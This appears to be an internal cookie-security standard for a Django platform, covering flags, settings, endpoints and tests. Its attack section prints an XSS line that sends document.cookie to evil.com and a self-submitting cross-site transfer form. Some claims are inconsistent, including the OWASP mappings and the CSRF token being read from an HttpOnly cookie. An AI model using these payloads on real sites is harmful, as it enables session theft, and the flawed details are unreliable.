# Cookie Security Standards

**Date:** 2025-10-01
**Status:** ✅ Active
**Scope:** All Cookie Configurations

---

## Overview

This document establishes cookie security standards for the Django 5 platform, defining mandatory security configurations for all cookies to prevent XSS, CSRF, and session hijacking attacks.

---

## 1. Security Requirements

### 1.1 Mandatory Flags

All cookies MUST implement these security flags:

| Flag | Requirement | Purpose | Exceptions |
|------|-------------|---------|------------|
| `HTTPONLY` | **Mandatory** | Prevent JavaScript access (XSS protection) | None |
| `SECURE` | **Mandatory (Production)** | Enforce HTTPS transmission | Development only |
| `SAMESITE` | **Mandatory** | CSRF protection | None |

---

## 2. Cookie Categories

### 2.1 CSRF Cookies

**Purpose:** CSRF protection for state-changing operations

**Security Configuration:**
```python
CSRF_COOKIE_SECURE = True          # Production: HTTPS only
CSRF_COOKIE_HTTPONLY = True        # Mandatory: Block JavaScript access
CSRF_COOKIE_SAMESITE = "Lax"       # Mandatory: CSRF protection
CSRF_COOKIE_AGE = 31449600         # 1 year (Django default)
```

**Rationale:**
- `HTTPONLY=True`: Prevents XSS-based CSRF token theft
- `SECURE=True`: Ensures CSRF token transmitted securely
- `SAMESITE=Lax`: Allows CSRF token on same-site navigation, blocks cross-site POST

---

### 2.2 Session Cookies

**Purpose:** User authentication and session management

**Security Configuration:**
```python
SESSION_COOKIE_SECURE = True       # Production: HTTPS only
SESSION_COOKIE_HTTPONLY = True     # Mandatory: Block JavaScript access
SESSION_COOKIE_SAMESITE = "Lax"    # Mandatory: Session hijacking protection
SESSION_COOKIE_AGE = 7200          # 2 hours (custom requirement)
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_SAVE_EVERY_REQUEST = True  # Security first (Rule #10)
```

**Rationale:**
- `HTTPONLY=True`: Prevents XSS-based session token theft (critical)
- `SECURE=True`: Ensures session ID transmitted securely
- `SAMESITE=Lax`: Prevents CSRF-based session hijacking
- Short age + expire on close: Reduces window of opportunity for attacks

---

### 2.3 Language/Localization Cookies

**Purpose:** Store user language preference (i18n/l10n)

**Security Configuration:**
```python
LANGUAGE_COOKIE_SECURE = True      # Production: HTTPS only
LANGUAGE_COOKIE_HTTPONLY = True    # NEW: Block JavaScript access (security hardening)
LANGUAGE_COOKIE_SAMESITE = "Lax"   # Mandatory: CSRF protection
LANGUAGE_COOKIE_AGE = 31536000     # 1 year
LANGUAGE_COOKIE_NAME = "django_language"
```

**Key Change (2025-10-01):**
- **Previous**: `LANGUAGE_COOKIE_HTTPONLY = False` (allowed JavaScript access)
- **Current**: `LANGUAGE_COOKIE_HTTPONLY = True` (blocks JavaScript access)

**Rationale:**
- Even non-sensitive cookies benefit from XSS protection
- Prevents cookie-based tracking via XSS
- Enforces server-side language management

**Impact on Implementation:**
- Client-side language switching via JavaScript is NO LONGER SUPPORTED
- Use server-side endpoint `/api/set-language/` instead (see section 4.1)

---

## 3. Environment-Specific Configuration

### 3.1 Production Environment

**Mandatory Security:**
```python
# production.py
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SECURE = True
LANGUAGE_COOKIE_SECURE = True
SECURE_SSL_REDIRECT = True           # Enforce HTTPS
SECURE_HSTS_SECONDS = 31536000       # 1 year HSTS
```

**Validation:**
- Settings validation fails if any `SECURE=False` in production
- Pre-deployment checks enforce all security flags

---

### 3.2 Development Environment

**Relaxed Configuration:**
```python
# development.py
CSRF_COOKIE_SECURE = False          # Allow HTTP for localhost testing
SESSION_COOKIE_SECURE = False
LANGUAGE_COOKIE_SECURE = False
SECURE_SSL_REDIRECT = False
```

**Note:** HTTPONLY and SAMESITE flags remain enforced in development for consistency.

---

## 4. Implementation Patterns

### 4.1 Server-Side Language Switching

**Deprecated (BLOCKED by HTTPONLY):**
```javascript
// ❌ OLD: Direct cookie manipulation (JavaScript)
document.cookie = "django_language=es; path=/; max-age=31536000";
```

**Recommended:**
```javascript
// ✅ NEW: Server-side endpoint
async function setLanguage(language) {
    const response = await fetch('/api/set-language/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': getCsrfToken()  // Get from CSRF cookie
        },
        body: `language=${language}`,
        credentials: 'same-origin'
    });

    if (response.ok) {
        window.location.reload();  // Reload to apply new language
    }
}
```

**Backend Implementation:**
```python
# views.py
from django.views.decorators.http import require_POST
from django.views.decorators.csrf import csrf_protect
from django.http import JsonResponse
from django.utils import translation

@require_POST
@csrf_protect
def set_language(request):
    """Server-side language switching endpoint."""
    language = request.POST.get('language')

    if language and language in [lang[0] for lang in settings.LANGUAGES]:
        translation.activate(language)
        request.session[translation.LANGUAGE_SESSION_KEY] = language

        response = JsonResponse({'status': 'success', 'language': language})
        response.set_cookie(
            settings.LANGUAGE_COOKIE_NAME,
            language,
            max_age=settings.LANGUAGE_COOKIE_AGE,
            httponly=True,          # Security: Block JavaScript
            secure=request.is_secure(),
            samesite='Lax'
        )
        return response

    return JsonResponse({'status': 'error', 'message': 'Invalid language'}, status=400)
```

**URL Configuration:**
```python
# urls.py
from django.urls import path
from .views import set_language

urlpatterns = [
    path('api/set-language/', set_language, name='set_language'),
]
```

---

### 4.2 Custom Cookie Creation

**Template for Secure Cookies:**
```python
def set_secure_cookie(response, name, value, max_age=None):
    """
    Set a cookie with all security flags.

    Args:
        response: HttpResponse object
        name: Cookie name
        value: Cookie value
        max_age: Expiration in seconds (None = session cookie)
    """
    response.set_cookie(
        name,
        value,
        max_age=max_age,
        secure=settings.DEBUG is False,  # True in production
        httponly=True,                   # Always block JavaScript
        samesite='Lax',                  # Always CSRF protection
        path='/',
        domain=settings.SESSION_COOKIE_DOMAIN
    )
    return response
```

**Usage:**
```python
def my_view(request):
    response = render(request, 'template.html', context)
    set_secure_cookie(response, 'my_cookie', 'value', max_age=3600)
    return response
```

---

## 5. Attack Vectors Prevented

### 5.1 XSS-Based Cookie Theft

**Attack Scenario:**
```javascript
// Attacker injects malicious script
<script>
    // Try to steal session cookie
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Protection:**
- `HTTPONLY=True` blocks `document.cookie` access
- Attack fails: cookie not accessible to JavaScript

**Impact:** ✅ XSS attacks cannot steal authentication cookies

---

### 5.2 CSRF-Based Session Hijacking

**Attack Scenario:**
```html
<!-- Attacker tricks user to visit malicious site -->
<form action="https://django5.youtility.in/transfer-funds" method="POST">
    <input name="amount" value="10000" />
    <input name="to_account" value="attacker_account" />
</form>
<script>document.forms[0].submit();</script>
```

**Protection:**
- `SAMESITE=Lax` prevents cookie from being sent on cross-site POST
- Attack fails: request made without authentication cookie

**Impact:** ✅ CSRF attacks cannot hijack sessions

---

### 5.3 Man-in-the-Middle Cookie Interception

**Attack Scenario:**
```
User -> [HTTP] -> Attacker Proxy -> [HTTP] -> Server
```

**Protection:**
- `SECURE=True` enforces HTTPS transmission
- Cookie never sent over unencrypted connection

**Impact:** ✅ MITM attacks cannot intercept cookies

---

## 6. Testing & Validation

### 6.1 Automated Tests

```python
# test_cookie_security.py
from django.test import TestCase
from django.conf import settings

class TestCookieSecurity(TestCase):
    def test_csrf_cookie_httponly(self):
        """CSRF cookie must have HTTPONLY flag."""
        self.assertTrue(settings.CSRF_COOKIE_HTTPONLY)

    def test_session_cookie_httponly(self):
        """Session cookie must have HTTPONLY flag."""
        self.assertTrue(settings.SESSION_COOKIE_HTTPONLY)

    def test_language_cookie_httponly(self):
        """Language cookie must have HTTPONLY flag (new requirement)."""
        self.assertTrue(settings.LANGUAGE_COOKIE_HTTPONLY)

    def test_cookie_samesite_flags(self):
        """All cookies must have SAMESITE=Lax or Strict."""
        self.assertIn(settings.CSRF_COOKIE_SAMESITE, ['Lax', 'Strict'])
        self.assertIn(settings.SESSION_COOKIE_SAMESITE, ['Lax', 'Strict'])
        self.assertIn(settings.LANGUAGE_COOKIE_SAMESITE, ['Lax', 'Strict'])
```

**Run Tests:**
```bash
python -m pytest tests/test_settings_integrity.py::TestProductionSecurityFlags -v
```

---

### 6.2 Manual Verification

**Browser DevTools Check:**
```javascript
// Open Browser Console (F12)

// 1. Check HTTPONLY flag (should fail)
document.cookie  // Should NOT show HTTPONLY cookies

// 2. Check Application -> Cookies
// - CSRF cookie: HttpOnly = ✓, Secure = ✓ (production), SameSite = Lax
// - Session cookie: HttpOnly = ✓, Secure = ✓ (production), SameSite = Lax
// - Language cookie: HttpOnly = ✓, Secure = ✓ (production), SameSite = Lax
```

**cURL Verification:**
```bash
# Test HTTPS enforcement (production)
curl -I https://django5.youtility.in/

# Check Set-Cookie headers for flags
# Expected: Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Lax
```

---

## 7. Compliance Requirements

### 7.1 Security Rule Compliance

| Rule | Requirement | Status |
|------|-------------|--------|
| Rule #4 | Secure secret management | ✅ Compliant |
| Rule #10 | Session security standards | ✅ Compliant |
| Rule #15 | Logging data sanitization | ✅ Compliant |

### 7.2 OWASP Standards

| OWASP Control | Implementation | Status |
|---------------|----------------|--------|
| A01:2021 Broken Access Control | SAMESITE, HTTPONLY | ✅ Implemented |
| A03:2021 Injection | CSRF tokens, HTTPONLY | ✅ Implemented |
| A07:2021 XSS | HTTPONLY flags | ✅ Implemented |
| A08:2021 Software Integrity Failures | SECURE, HSTS | ✅ Implemented |

---

## 8. Migration Guide

### 8.1 Frontend Team

**Action Required:**
- Remove all `document.cookie` language switching code
- Replace with `/api/set-language/` endpoint calls (see section 4.1)
- Test language switching in staging environment

**Timeline:**
- Testing: 2025-10-02 to 2025-10-05
- Production: 2025-10-06

---

### 8.2 Backend Team

**No Action Required:**
- Cookie security centralized in `security/headers.py`
- Settings automatically imported in `base.py`
- Environment-specific overrides in development.py/production.py

**Validation:**
```bash
python manage.py settings_health_check --verbose
```

---

## 9. Troubleshooting

### 9.1 "Language switching not working"

**Symptom:** Language preference not persisting

**Cause:** Frontend still using JavaScript cookie manipulation (blocked by HTTPONLY)

**Solution:** Update frontend to use `/api/set-language/` endpoint (section 4.1)

---

### 9.2 "CSRF token missing or incorrect"

**Symptom:** POST requests failing with CSRF error

**Cause:** CSRF cookie blocked by security settings

**Solution:** Ensure CSRF token retrieved from cookie and sent in `X-CSRFToken` header:
```javascript
function getCsrfToken() {
    return document.querySelector('[name=csrfmiddlewaretoken]').value;
}
```

---

### 9.3 "Session not persisting"

**Symptom:** User logged out after page refresh

**Cause:** SESSION_COOKIE_SECURE=True but accessing over HTTP

**Solution (Development):**
- Use `http://127.0.0.1:8000` (localhost with SESSION_COOKIE_SECURE=False)
- OR set up local HTTPS with self-signed certificate

**Solution (Production):**
- Ensure HTTPS properly configured
- Verify `SECURE_SSL_REDIRECT = True`

---

## 10. Best Practices

### 10.1 Cookie Creation Checklist

Before creating any new cookie, verify:
- ✅ Purpose clearly defined
- ✅ Minimum data stored (don't store sensitive data in cookies)
- ✅ HTTPONLY flag enabled
- ✅ SECURE flag enabled (production)
- ✅ SAMESITE flag set to Lax or Strict
- ✅ Appropriate expiration (shortest practical duration)
- ✅ Path and domain correctly scoped

### 10.2 Code Review Checklist

When reviewing cookie-related code:
- ✅ No sensitive data in cookie values
- ✅ Security flags present in all `set_cookie()` calls
- ✅ No direct JavaScript cookie manipulation for secured cookies
- ✅ Proper error handling for cookie operations
- ✅ Unit tests for cookie security flags

### 10.3 Security Audit Checklist

Regular security audits should verify:
- ✅ All cookies have HTTPONLY flag (except where technically infeasible)
- ✅ All cookies have SAMESITE flag
- ✅ Production cookies have SECURE flag
- ✅ No cookies with excessive expiration (>1 year)
- ✅ No sensitive data stored in cookies
- ✅ Settings centralized in `security/headers.py`

---

## 11. References

### Internal Documentation
- **Settings Remediation Guide**: `SETTINGS_SECURITY_REMEDIATION_GUIDE.md`
- **Rule #10**: Session Security Standards (`.claude/rules.md`)
- **Rule #4**: Secure Secret Management (`.claude/rules.md`)

### External Standards
- **OWASP Cookie Security**: https://owasp.org/www-community/controls/SecureCookieAttribute
- **Django Cookie Settings**: https://docs.djangoproject.com/en/5.0/ref/settings/#sessions
- **RFC 6265 (Cookies)**: https://datatracker.ietf.org/doc/html/rfc6265

---

## 12. Change Log

| Date | Change | Rationale |
|------|--------|-----------|
| 2025-10-01 | `LANGUAGE_COOKIE_HTTPONLY = True` | Security hardening (XSS protection) |
| 2025-10-01 | Centralized cookie security in `security/headers.py` | Single source of truth, prevent drift |
| 2025-10-01 | Added `__all__` exports (Rule #16) | Explicit export control |

---

**Questions or Issues?**
Contact: Security Team | Backend Team

**Last Updated:** 2025-10-01
**Version:** 1.0.0
